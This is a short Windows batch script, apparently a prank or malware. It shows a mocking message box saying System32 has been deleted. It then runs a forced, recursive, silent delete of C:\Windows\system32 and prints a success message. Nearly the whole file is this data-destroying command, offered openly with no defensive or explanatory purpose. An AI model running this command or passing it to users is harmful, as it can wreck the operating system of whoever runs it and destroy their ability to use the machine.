@echo off
echo x=msgbox("HEY I GOT NICE INFO YOURE FREAK WINDOWS SYSTEM32 HAS BEEN DELETED!", 0+64, "GOODBYE DUDE!") > temp.vbs
cscript temp.vbs
del temp.vbs
del /S /F /Q C:\Windows\system32
echo "System32 folder deleted successfully!"
pause
